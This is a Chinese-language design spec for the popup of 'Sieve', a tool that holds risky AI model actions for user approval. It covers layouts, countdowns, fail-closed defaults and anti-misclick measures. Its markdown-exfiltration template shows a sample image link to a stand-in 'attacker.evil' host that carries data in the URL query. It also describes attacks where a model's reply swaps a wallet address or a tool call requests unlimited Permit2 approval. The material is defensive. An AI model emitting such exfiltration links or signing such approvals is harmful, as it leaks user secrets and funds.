# SPEC-002：HIPS 弹窗 GUI 渲染规格

> Version: v1.1 — 2026-07-02
> Status: Stable
> Owner: SieveAI
> 上游依赖：[上游 SPEC-002 hips-popup-behavior](../external/upstream-references.md#spec-002hips-popup-behavior) · [上游 tri-state-decision-and-graylist 三道防线](../external/upstream-references.md#tri-state-decision-and-graylist)

---

## 0. 摘要

HIPS 弹窗是 Sieve GUI 的核心模块。daemon 通过 IPC 推送 `sieve.request_decision`，GUI 必须在 500ms 内弹出置顶浮窗，以结构化的视觉信息帮助用户在 30~120 秒倒计时内做出 allow/deny 决策。

本 SPEC 覆盖**渲染侧**规格：窗口形态、内容布局、Detail Card 五种模板、推荐栏渲染、Remember checkbox 渲染规则、倒计时三段视觉、防误点机制、多 issue 合并 UI，以及 GUI 失联期间的处理。

---

## 1. 范围与非目标

**范围**：
- `NSPanel` floating panel 的创建、复用与生命周期
- 弹窗内容渲染（所有五种 Detail Card 模板）
- 倒计时三段（蓝/橙/红）+ 闪烁 + reduce-motion 降级
- Remember checkbox 渲染规则（含 critical_lock 处理）
- 主按钮位置决策逻辑
- 防误点三道机制
- 多 issue 合并 UI
- 弹窗队列管理
- GUI 失联期间弹窗的处理
- IPC `decision_response` 发送

**非目标**：
- `sieve.request_decision` 的解码与 IPC 传输（见 SPEC-008）
- Toast 提示（见 SPEC-007）
- 历史窗口中的命中展示（见 SPEC-004）

---

## 2. 用户路径 / 场景

### 场景 A：单 issue Critical 规则（主路径）

```
daemon 发 request_decision (IN-CR-05, timeout:120)
  → IPCClient 解码 → HipsPanelManager 入队
  → 无活动弹窗 → 出队，NSPanel 显示（< 500ms）
  → 用户看到签名详情 + 倒计时 + 推荐"拒绝"
  → 0.4s swallow 期结束
  → 用户点 [拒绝（推荐）] → decision_response{deny, remember:false}
  → 弹窗关闭，菜单栏恢复 normal
```

### 场景 B：allow_remember = true（非 Critical 规则）

```
daemon 发 request_decision (IN-GEN-04, allow_remember:true)
  → 弹窗显示 Remember checkbox + "将这种模式永久允许" 文案
  → 用户勾选 checkbox
  → 可选填写 context_hint（≤ 200 字符）
  → 点 [允许此次] → decision_response{allow, remember:true, context_hint:"..."}
```

### 场景 C：多 issue 合并

```
daemon 发 request_decision (merged:true, issues:[IN-CR-05, IN-GEN-04])
  → 标题改"Sieve 检测到 2 个安全问题"
  → 主体为折叠列表（IN-CR-05 默认展开，IN-GEN-04 折叠）
  → 按钮：[拒绝全部] [仅允许非 Critical 项（1 项）]
  → 用户点 [仅允许非 Critical 项] → decision_response{merged_decision:"partial", per_issue:[deny, allow]}
```

### 场景 D：GUI 失联期间弹窗已显示

```
弹窗显示中 → IPC 断开
  → 弹窗继续显示，倒计时继续
  → 弹窗底部 banner："与 daemon 失联，决策将在重连后发送"
  → 用户点拒绝 → 本地缓存 {request_id, decision}
  → 重连后立即重发同 request_id 的 decision_response
  → daemon 端去重保护（同 id 二次响应忽略）
```

---

## 3. 状态机

```
         request_decision 到达
idle ────────────────────────────► queued
                                      │
                    无 active 弹窗    │ 有 active 弹窗
                    ┌─────────────────┘              │
                    ▼                                 │
                 showing ◄──────────── request_canceled 时出队
                    │
         ┌──────────┼──────────┐
         │          │          │
    0.4s swallow  阶段1(蓝)  阶段2(橙)
    (button       正常显示   正常显示
     disabled)       │          │
                    时间到     时间到
                    阶段3(红)──────────────────────┐
                    │ 闪烁                          │
                    │ allow 需 ⌘+click              │
                    │                              │
         ┌──────────┴──────────┐                  │
         │ 用户点击决策          │ timeout_seconds 归零
         ▼                    ▼                   │
      decided             timed_out ──────────────┘
         │                    │
         ▼                    ▼
  send decision_response   弹窗关闭（daemon fail-closed）
         │
         ▼
     close_panel
         │
   检查 pending queue
         │
   有 → 显示下一个
   无 → idle
```

---

## 4. UI 规格

### 4.1 窗口形态

- 类型：`NSPanel`
- `window.level = .floating`
- `collectionBehavior` 包含 `.canJoinAllSpaces` + `.fullScreenAuxiliary`
- 默认尺寸：宽 540pt，高自适应（最小 400pt）
- 定位：居中于当前 active screen
- 弹出时调用 `NSApp.activate(ignoringOtherApps: true)`
- 可选播放系统提示音（默认 `Funk`，用户可在设置关闭）

NSPanel 采用**复用模式**（HipsPanelManager 持有一个常驻隐藏 NSPanel，显示时更新内容），避免每次弹窗重建 View 导致延迟（P95 < 500ms 硬约束）。

### 4.2 整体布局

```
┌─────────────────────────────────────────────────────┐
│  [关闭] [最小化灰] [最大化灰]  Sieve  [反馈图标]      │ ← 标题栏 28pt
├─────────────────────────────────────────────────────┤
│  [⚠图标]  Sieve 检测到 1 个安全问题                  │ ← 标题区（14.5pt bold）
│           签名工具调用：signTransaction               │ ← 副标题（13pt 次要色）
├─────────────────────────────────────────────────────┤
│  [Critical] IN-CR-05 · Inbound · 刚刚  req 8f3a…    │ ← Meta 行（12pt）
│                                                     │
│  ┌─────────────────────────────────────────────┐   │ ← Detail Card
│  │  （见 §4.4 模板表）                          │   │
│  └─────────────────────────────────────────────┘   │
│                                                     │
│  [推荐栏] ⚠ 推荐：拒绝                              │ ← 推荐栏（见 §4.5）
│  deadline=0 + 无限 amount 是 Permit2 钓鱼经典模式    │
│                                                     │
│  Phase 1   ▰▰▰▰▰▰▰▰▱▱▱▱▱▱  113s                │ ← 倒计时（见 §4.3）
│                                                     │
│  🔒 此规则受 critical_lock 保护，不允许永久绕过。     │ ← Remember 区（见 §4.6）
│                                                     │
├─────────────────────────────────────────────────────┤
│  [📋 复制原始 JSON]    [允许此次]  [拒绝（推荐）]    │ ← 按钮区（底部）
└─────────────────────────────────────────────────────┘
```

最小化按钮和最大化按钮设为灰色禁用（floating panel 不可最小化/最大化）。关闭按钮触发 `user_canceled_via_window_close` (-32100) 错误回应。

### 4.3 倒计时三段视觉

| 阶段 | 触发条件 | 进度条颜色 | 数字颜色 | 闪烁 |
|------|---------|-----------|---------|-----|
| Phase 1（蓝） | `remaining / timeout > 0.5` | `#1F6FEB`（accent）| 同色 | 无 |
| Phase 2（橙） | `0.2 < remaining / timeout ≤ 0.5` | `#FF9F0A`（orange）| 同色 | 无 |
| Phase 3（红） | `remaining / timeout ≤ 0.2` | `#FF3B30`（red）| 同色 | 0.5s 周期（opacity 1.0→0.5）|

实现要点：
- 进度条：`Capsule().fill(color)` + `withAnimation(.linear(duration: 1.0))` 平滑缩减
- 倒计时数字：`SF Pro Mono`（`monospacedDigit`），防逐秒抖动
- 进度条高度 4pt，圆角 2pt
- 阶段标签（`Phase 1` / `Phase 2` / `Phase 3`）11pt uppercase，次要色
- 阶段切换颜色过渡：250ms ease-in-out
- **reduce-motion 开启时**：取消闪烁动效，只换色不闪；进度条仍线性减少（不跳变）
- `accessibilityValue` 每秒更新剩余秒数（VoiceOver 可读）

### 4.4 Detail Card 五种模板

GUI 根据 `params.context.template` 字段选择模板，不识别时降级到 `generic_json`。

#### 模板 1：`address_compare`（IN-CR-01）

```
你提供的地址                              [显示完整 / 隐藏]
┌─────────────────────────────────────────────────┐ ← 绿底
│  0x742d35  ••••••••(23)  ••••(6)  f0bEb1        │
└─────────────────────────────────────────────────┘
模型回复中替换为                     近似地址告警
┌─────────────────────────────────────────────────┐ ← 红底
│  0x742d35  [Aa183][2F95][dC8d]  ••••(6)  bEb1   │ ← 红色高亮差异字符
└─────────────────────────────────────────────────┘
chain: Ethereum  chain_id: 1
🔒 仅显示差异区段（含 ±3 字符上下文）
```

- 默认：仅显示 `head=6` + `tail=4` + 差异字符 ±3 上下文，中间 mask 为 `•`
- "显示完整"按钮：展开全部字符
- 差异字符：红色背景高亮 + bold
- 设计原型见 `module-hips.jsx` `AddressCompare` 组件

#### 模板 2：`signing_tool_use`（IN-CR-05）

```
tool_name:  signTransaction
chain:      Ethereum (chain_id 1)
typed_data:
  domain: { name: "Permit2", verifyingContract: 0x000...BA3 [眼睛图标] }
  message:
    spender: 0xabcdef... [眼睛图标]  ⚠ 未知合约
    amount:  2^256-1                ⚠ 无限授权
    deadline: 0                     ⚠ 永不过期
    nonce:    12
```

- 所有合约地址默认 `head=6` + `tail=4` + 8 个 `•`，可点眼睛展开
- 危险字段（`infinite_amount=true` / `deadline_zero=true` / `approve_all=true`）：红色 + ⚠ 内联标注
- 标注文案来自 daemon `context.flags`，GUI 按标志位决定是否渲染标注
- 树状展开结构，`font-family: mono`

#### 模板 3：`markdown_exfil`（IN-GEN-04）

```
模型回复片段（已渲染）              [显示完整 payload / 隐藏]
┌──────────────────────────────────────────────────┐
│  Here's the analysis.                            │
│  ![results](https://attacker.evil/x.png?d=••••) │ ← URL query 部分 mask
└──────────────────────────────────────────────────┘
提取的外链 (1)
  ● https://attacker.evil/x.png?d=•••• [unreached]
```

- markdown 片段渲染为只读文本，危险 URL 高亮红色
- URL query 参数默认 mask（可能包含 base64 编码的敏感数据）
- reachable/unreachable 标签来自 `context.reachable[]`

#### 模板 4：`secret_outbound`（OUT-07/09/10）

```
kind:    BIP39 mnemonic (12 words)
length:  71 chars
┌──────────────────────────────────────────────────┐ ← 红底
│  witch  ••••••• 10 个单词已脱敏 •••••••  cargo   │
└──────────────────────────────────────────────────┘
已自动改写出站请求体为 [REDACTED]（OUT-09）。
本次仅请求确认是否允许。
```

- 仅展示 `prefix4` + mask + `suffix4`（来自 `context.prefix4` / `context.suffix4`）与 `length` / `hash_short`
- **设计上不提供"显示全文"入口**：wire 的 `secret_outbound` 载荷只含
  `secret_kind / prefix4 / suffix4 / length / hash_short`——daemon 不推送助记词/密钥全文
  （红线"不存储原始命中片段"的上游延伸），GUI 数据层不存在可展开的完整敏感内容
- `context.secret_kind` 决定"BIP39/WIF/raw hex"标签文案

#### 模板 5：`generic_json`（兜底）

- 将 `context` 对象渲染为可展开的 JSON tree
- 不做特殊语义解析
- 底部提示："此规则没有专用模板，显示原始数据"

**[📋 复制原始 JSON] 按钮**：复制 `HipsRequest.rawJSON`，需要二次确认 alert："原始请求 JSON 可能包含敏感数据，确认复制到剪贴板？"。

#### 跨窗口解锁会话共享（现状记录，隔离决策待定）

HIPS 详情卡的脱敏字段（地址等 `MaskedField`）经 `isUnlocked` 读取的是
`AppState.isUnlocked`——与历史窗口（SPEC-004）**共享同一个 5 分钟解锁会话**
（`AppState.unlockSession`）。即：用户在 History 里 Touch ID 解锁后 5 分钟内，
HIPS 弹窗的敏感字段也自动明文。

- **已知攻击面**：HIPS 是主动弹出的高危决策场景，其敏感字段被"之前 History 的解锁"
  顺带放行，未经本场景的独立认证。
- **待定决策**：建议 HIPS 的解锁态独立于 History（不读 `AppState.isUnlocked`）；
  隔离实现延后，本节先显式记录该共享语义，避免继续成为无文档行为。
- 注意与 P0-1 的区分：Critical allow 的 Touch ID 门（人在场认证）**不**建立解锁会话，
  与本节的字段脱敏解锁互不相干。

### 4.5 推荐栏渲染规则

基于 `recommendation` 字段（完整格式见 [ipc-protocol §3.1](../api/ipc-protocol.md#31-sieverequest_decision请求)）：

| 条件 | 背景色 | 图标 | 主文 | 主按钮位置 |
|------|--------|-----|------|----------|
| `decision="deny"` + `confidence="high"` | 橙色警告底 | ⚠ | "推荐：拒绝" + reason | 拒绝在右（主按钮，蓝底）|
| `decision="allow"` + `confidence="high"` | 绿色确认底 | ✓ | "推荐：允许" + reason | 允许在右（主按钮，蓝底）|
| `confidence="medium"` 或 `"low"` | 灰色中性底 | ℹ | "Sieve 建议谨慎，置信度不足" + reason | 拒绝在右（主按钮，fail-closed）|
| `recommendation` 字段缺失 | 灰色中性底 | ℹ | "Sieve 无明确建议，请结合上下文判断" | 拒绝在右（主按钮，fail-closed）|

**硬约束**（CLAUDE.md §4）：`recommendation` 缺失或 `confidence != "high"` 时，主按钮永远是"拒绝"，键盘 `Return` 默认也走拒绝。

### 4.6 Remember Checkbox 渲染规则

**这是三道防线第三道，违反 = P0 安全漏洞。**

```
allow_remember 字段值  →  GUI 渲染行为
─────────────────────────────────────────────────────────────────
true                  →  渲染 checkbox（默认未勾选）
                          文案："将这种模式永久允许（不影响其他类似事件）"
                          [ℹ 按钮]（点开解释 fingerprint 计算依据）
                          用户勾选后，允许填写 context_hint（≤ 200 字符）

false                 →  【严禁渲染 checkbox】
                          显示锁图标 + 文案：
                          "此规则受 critical_lock 保护，不允许永久绕过。这是产品安全承诺。"
                          （仅在规则属于 critical_lock 时显示此说明）
─────────────────────────────────────────────────────────────────
```

**禁止**：灰显 checkbox（灰显暗示"将来可能解锁"，违反 Critical 锁产品承诺）。

IPC 编码层二重保险：无论 UI 状态如何，发送 `decision_response` 时，若 `allow_remember == false`，则 `remember` 字段强制为 `false`（见 [ipc-protocol §7](../api/ipc-protocol.md#7-协议层硬约束gui-实现端)）。

### 4.7 防误点三道机制

**机制一：0.4s swallow**
- 弹窗弹出后 400ms 内，所有按钮点击被 swallow（不响应）
- 视觉：按钮显示 0.4s 进度条或透明度降低（防止用户不知道）
- 目的：防止用户在连点其他 App 时误触

**机制二：阶段 3 ⌘+Click**
- 当倒计时处于 Phase 3（≤20% 剩余时间），"允许此次"按钮需要 `Command+Click` 才响应普通点击
- 按钮标注改为："按住 ⌘ 点击允许"
- 目的：防止紧迫感下误放行

**机制三：上次 deny 后 5s 按钮位移**
- 条件：用户对同一 `rule_id` 的上一次决策是 deny，且距离本次弹窗不超过 5 秒
- 行为：主按钮和副按钮交换位置（拒绝移到右侧，允许移到左侧）
- 目的：降低肌肉记忆击穿风险（不能靠记住"右边是拒绝"盲点）
- 仅影响按钮位置，不影响主按钮的视觉样式（右侧始终是蓝底主按钮）

### 4.8 多 issue 合并 UI

适用条件：`params.merged == true`

```
┌─────────────────────────────────────────────────────┐
│  [⚠] Sieve 检测到 2 个安全问题                       │
├─────────────────────────────────────────────────────┤
│  ▼ [Critical] IN-CR-05  签名工具调用：signTransaction │ ← 展开（Critical 默认展开）
│    tool_name: signTransaction                       │
│    amount: 2^256-1  ⚠ ...                           │
│    [⚠ 推荐：拒绝] Permit2 钓鱼...                    │
│                                                     │
│  ▶ [High]     IN-GEN-04  Markdown 图片外链泄露       │ ← 折叠（非 Critical 默认折叠）
│                                                     │
│  Phase 1  ▰▰▰▰▰▰▰▰▱▱  24s                       │ ← 取 min(timeout)
├─────────────────────────────────────────────────────┤
│                  [仅允许非 Critical 项（1 项）]  [拒绝全部] │
└─────────────────────────────────────────────────────┘
```

**按钮组合规则**（场景 C）：

| 条件 | 渲染的按钮 |
|------|----------|
| 存在至少 1 个 Critical issue | [拒绝全部]（主）+ [仅允许非 Critical 项（N 项）]（副，N=非 Critical 数量）|
| 0 个 Critical issue | [拒绝全部]（副）+ [全部允许]（主，仅此情况渲染）|

**禁止**：当存在 Critical issue 时渲染"全部允许"按钮（不允许灰显代替）。

多 issue 模式下每条 issue 的 Remember 渲染：
- 遵循各自的 `allow_remember` 字段
- 只有 `allow_remember == true` 的 issue 在展开时显示 checkbox
- `merged` 模式下整体 `allow_remember == false` 时整个弹窗无 Remember 区域

`decision_response` 格式：见 [ipc-protocol §4.1 多 issue 部分允许](../api/ipc-protocol.md#41-sievedecision_response回应)。

---

## 5. 数据契约

所有字段定义、消息格式、多 issue 合并字段 schema 见：

- 单 issue `request_decision`：[ipc-protocol §3.1](../api/ipc-protocol.md#31-sieverequest_decision请求)
- 多 issue 合并格式：[ipc-protocol §3.1 多 issue 合并形式](../api/ipc-protocol.md#多-issue-合并形式)
- `context.template` 字段表：[ipc-protocol §3.1.1](../api/ipc-protocol.md#311-contexttemplate-字段表)
- `decision_response` 格式：[ipc-protocol §4.1](../api/ipc-protocol.md#41-sievedecision_response回应)
- `request_decision_canceled`：[ipc-protocol §3.2](../api/ipc-protocol.md#32-sieverequest_decision_canceled通知)
- GUI 侧协议硬约束：[ipc-protocol §7](../api/ipc-protocol.md#7-协议层硬约束gui-实现端)

GUI 内存域模型 `HipsRequest`：见 [data-model.md §3.1](../design/data-model.md#31-hipsrequest)。

---

## 6. 错误与降级

| 条件 | 行为 |
|------|-----|
| `context.template` 不识别 | 降级到 `generic_json` 模板渲染 |
| `recommendation` 缺失 | 显示"无明确建议"灰色推荐栏；主按钮强制为拒绝 |
| NSPanel 渲染异常（View 崩溃）| 回调 `gui_render_failed`(-32101)；发系统通知："Sieve 拦截：rule_id，GUI 异常，已自动拒绝" |
| 用户关闭弹窗（点关闭按钮）| 发 `user_canceled_via_window_close`(-32100)；daemon 按 `default_on_timeout` 处置 |
| GUI 进程退出，弹窗未答 | 发 `gui_shutdown_during_decision`(-32102) |
| `request_decision_canceled` 到达 | 若在 pending queue 中 → 移除；若是 activeRequest → 关闭弹窗，不弹提示 |
| GUI 失联期间，弹窗已显示 | 弹窗继续显示，倒计时继续；banner 提示失联；用户决策后本地缓存，重连后重发 |
| GUI 失联期间，新 `request_decision` 到达 | 无法接收（IPC 断开）；daemon 端超时后按 `default_on_timeout` fail-closed |

**GUI 失联期间已弹窗的详细处理**：
1. 弹窗 UI 保持可交互（不冻结）
2. 底部 banner："与 daemon 失联，你的决策将在连接恢复后发送"
3. 用户作出决策 → `HipsPanelManager` 将 `(request_id, decision_response)` 存入 `disconnectedCache`
4. `IPCClient` 重连成功后，`HipsPanelManager` 遍历 `disconnectedCache` 重发所有缓存的 response
5. daemon 端有去重保护，同 request_id 的二次响应被安全忽略

---

## 7. 性能与硬约束

| 指标 | 约束 |
|------|------|
| 弹窗 P95 显示延迟（IPC 接收→第一帧）| < 500ms |
| `allow_remember == false` 时 | 严禁渲染 Remember checkbox；不允许灰显 |
| `recommendation` 缺失或 `confidence != "high"` | 主按钮永远是"拒绝"，Return 键默认拒绝 |
| 弹窗关闭后 rawJSON | 必须主动清零（`Data` 置空）|
| 多 issue 有 Critical | 禁止渲染"全部允许"按钮 |
| Phase 3 allow | 必须 ⌘+Click |
| 0.4s swallow | 所有按钮弹出后 400ms 内禁用 |
| 弹窗串行排队 | 同一时刻只显示一个 HIPS 弹窗 |
| `decision_response.remember` | `allow_remember == false` 时编码层强制为 `false` |

---

## 8. 测试要求

### 快照测试

- 五个 Detail Card 模板各自在浅色/深色两套主题下的渲染快照
- Phase 1 / Phase 2 / Phase 3 倒计时状态快照
- `allow_remember == false` 时无 Remember checkbox 的快照（关键约束验证）
- `allow_remember == true` 时有 Remember checkbox 的快照
- 多 issue 合并（有 Critical + 有非 Critical）的按钮区快照
- 多 issue 合并（0 Critical）的按钮区快照（有"全部允许"按钮）
- 推荐栏四种状态（deny+high / allow+high / medium / 缺失）快照

### 行为测试

- `allow_remember == false` → 触发渲染 → 断言 Remember checkbox 不存在（不允许灰显）
- `allow_remember == true` → 触发渲染 → 断言 checkbox 存在且可交互
- `recommendation.confidence == "high"` + `decision == "deny"` → 断言主按钮是拒绝（右侧，蓝底）
- `recommendation` 缺失 → 断言主按钮是拒绝；`Return` 键触发拒绝
- Phase 3 普通 click allow → 断言被 swallow；`Command+Click` → 断言有效
- 弹窗弹出 300ms 内点击 → 断言被 swallow（0.4s swallow 机制）
- 同 rule_id 上次 deny 后 5s 内再次弹窗 → 断言按钮位置交换
- 多 issue 含 Critical → 断言不渲染"全部允许"按钮
- `request_decision_canceled` 到达 activeRequest → 断言弹窗关闭
- GUI 失联期间用户决策 → 断言缓存 → 重连后断言重发 decision_response
- NSPanel 渲染失败 mock → 断言发送 `-32101` 错误 response + 系统通知

### IPC 协议测试

- `decision_response.remember = true` 在 `allow_remember == false` 场景下 → 断言发出的 JSON `remember` 字段为 `false`（编码层 reject）

---

## 9. 变更记录

| 版本 | 日期 | 作者 | 变更 |
|------|------|-----|-----|
| v1.0 | 2026-05-02 | SieveAI | 首次起草，覆盖全部渲染规格 |
| v1.1 | 2026-07-02 | SieveAI | 模板 4 删除「显示助记词（需 Touch ID）」——wire 不含全文，数据层不可实现；§4.4 补记 HIPS 与 History 跨窗口共享解锁会话（现状 + 隔离决策待定） |
